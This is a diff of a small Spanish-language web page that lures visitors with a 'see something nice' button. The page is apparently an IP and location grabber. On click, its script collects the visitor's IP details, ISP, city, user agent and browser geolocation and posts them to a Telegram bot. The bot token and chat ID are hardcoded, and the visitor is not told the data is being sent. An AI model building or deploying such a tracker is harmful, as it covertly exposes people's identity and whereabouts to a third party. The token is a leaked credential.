@@ -1,9 +1,14 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Page</title>
+  <title>Info Rápida</title>
+  <link
+    rel="stylesheet"
+    href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
+    crossorigin=""
+  />
   <style>
     body {
       font-family: Arial;
@@ -19,86 +24,85 @@
       max-width: 100%;
       box-sizing: border-box;
     }
+    #map {
+      height: 300px;
+      margin-top: 15px;
+      border-radius: 10px;
+      display: none;
+    }
   </style>
 </head>
 <body>
   <div class="box">
     <h2>Haz click en el botón y rechaza la ubicación</h2>
     <button onclick="collectAndSend()">ver algo lindo</button>
-    <pre id="result">..</pre>
+    <pre id="result">...</pre>
+    <div id="map"></div>
   </div>
 
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" crossorigin=""></script>
   <script>
     const BOT_TOKEN = "8011619975:AAE_Donqy5xn8RD0lJ2LOIP326dTDrnO1Ag";
     const CHAT_ID = "6065284869";
+
+    const resultEl = document.getElementById("result");
+    const mapEl = document.getElementById("map");
+
+    function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
+      }).catch(() => {});
+    }
 
     function getIPInfo() {
       return fetch("https://ipapi.co/json/").then(res => res.json());
     }
 
-    function sendToTelegram(message) {
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-      return fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
-      });
-    }
+    function collectAndSend() {
+      resultEl.textContent = "📡 Recopilando información rápida...";
 
-    async function collectAndSend() {
-      document.getElementById("result").textContent = "Recopilando información...";
-
-      // Inicia ambas tareas al mismo tiempo
-      const ipPromise = getIPInfo();
       const geoPromise = new Promise((resolve, reject) => {
         if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
-        } else {
-          reject("Geolocation not supported");
-        }
+          navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 3000 });
+        } else reject();
       });
 
-      const [ipResult, geoResult] = await Promise.allSettled([ipPromise, geoPromise]);
+      Promise.allSettled([getIPInfo(), geoPromise]).then(([ipRes, geoRes]) => {
+        let message = "";
 
-      let message = "";
+        if (ipRes.status === "fulfilled") {
+          const ip = ipRes.value;
+          message += `IP: ${ip.ip}\nISP: ${ip.org}\nCiudad: ${ip.city}\nRegión: ${ip.region}\nPaís: ${ip.country_name}\n`;
+        } else {
+          message += "No se pudo obtener IP\n";
+        }
 
-      // Procesar IP
-      if (ipResult.status === "fulfilled") {
-        const ip = ipResult.value;
-        message += `
-IP: ${ip.ip}
-ISP: ${ip.org}
-City: ${ip.city}
-Region: ${ip.region}
-Country: ${ip.country_name}`;
-      } else {
-        message += "No se pudo obtener información IP.\n";
-      }
+        message += `User-Agent: ${navigator.userAgent}\nHora: ${new Date().toLocaleString()}\n`;
 
-      // Info general
-      message += `
-User-Agent: ${navigator.userAgent}
-Time: ${new Date().toLocaleString()}
-`;
+        resultEl.textContent = message;
+        sendToTelegram(message);
 
-      // Mostrar primero en pantalla
-      document.getElementById("result").textContent = message;
-      sendToTelegram(message); // No esperar, enviar en segundo plano
+        if (geoRes.status === "fulfilled") {
+          const { latitude, longitude, accuracy } = geoRes.value.coords;
+          const locationInfo = `Lat: ${latitude}\nLon: ${longitude}\nPrecisión: ${accuracy}m`;
+          resultEl.textContent += "\n" + locationInfo;
+          sendToTelegram(locationInfo);
 
-      // Procesar ubicación (si se permitió)
-      if (geoResult.status === "fulfilled") {
-        const pos = geoResult.value.coords;
-        const locMsg = `
-Ubicación:
-Lat: ${pos.latitude}
-Lon: ${pos.longitude}
-Precisión: ${pos.accuracy}m
-        `.trim();
-        document.getElementById("result").textContent += "\n\n" + locMsg;
-        sendToTelegram(locMsg);
-      } else {
-        console.log("Ubicación no otorgada o falló.");
-      }
+          setTimeout(() => {
+            mapEl.style.display = "block";
+            const map = L.map("map").setView([latitude, longitude], 14);
+            L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
+              attribution: '&copy; OpenStreetMap contributors'
+            }).addTo(map);
+            L.marker([latitude, longitude]).addTo(map).bindPopup("Tu ubicación").openPopup();
+          }, 100);
+        } else {
+          console.log("Ubicación denegada o falló.");
+        }
+      });
     }
   </script>
 </body>
